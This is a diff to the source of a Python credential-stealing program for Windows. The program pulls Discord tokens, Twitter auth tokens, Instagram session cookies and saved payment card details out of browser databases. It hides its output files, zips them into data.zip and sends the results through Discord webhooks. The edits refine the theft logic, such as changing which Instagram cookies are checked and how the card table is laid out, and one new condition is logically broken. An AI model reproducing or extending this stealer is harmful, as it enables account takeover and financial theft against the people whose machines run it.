@@ -130,7 +130,6 @@ def main():
         SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
     db = connect(filename)
     db.text_factory = lambda b: b.decode(errors="ignore")
-    result = []
     for w in website:
         if w == 'discord.com':
             tokens = []
@@ -175,9 +174,9 @@ def main():
                 insta_cookies.append(b.split(', '))
             browser_ = defaultdict(dict)
             for c in insta_cookies:
-                if all([search(r"ds_user_id", str(c))!=None, search(r"sessionid", str(c))!=None, search(r"csrftoken", str(c))!=None]):
+                if all([search(r"ds_user_id", str(c))!=None, search(r"sessionid", str(c))!=None]):
                     for y in c:
-                        conditions = [search(r"ds_user_id", y)!=None, search(r"sessionid", y)!=None, search(r"csrftoken", y)!=None]
+                        conditions = [search(r"ds_user_id", y)!=None, search(r"sessionid", y)!=None]
                         if any(conditions):
                             browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[1].split("=")[1]
             for x in list(dict(browser_).keys()):
@@ -221,7 +220,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
     cpuinfo = get_cpu_info()
     main_info = main()
     discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
-    discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid", "csrftoken"], []
+    discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], []
     for t_ in main_info[0]:
         try:
             lst = get_user_data(t_)
@@ -238,7 +237,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
     for _p in main_info[3]:
         if _p[1] == 1:
             payment_card = PrettyTable(padding_width=1)
-            payment_card.field_names = ["Brand", "Type","Last 4", "Expiration", "Billing Adress"]
+            payment_card.field_names = ["Brand", "Last 4","Type", "Expiration", "Billing Adress"]
             payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
             pay_l.append(payment_card.get_string())
         elif _p[1] == 2:
@@ -256,7 +255,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
     replace_new("data.zip")
     with ZipFile("data.zip", mode='w', compression=ZIP_DEFLATED) as zip:
         SetFileAttributes("data.zip", win32con.FILE_ATTRIBUTE_HIDDEN)
-        if payment_card or payment_p:
+        if ('payment_card' or 'payment_p') in locals():
             replace_new("Payment Info.txt")
             with open("Payment Info.txt", 'w') as f:
                 SetFileAttributes("Payment Info.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
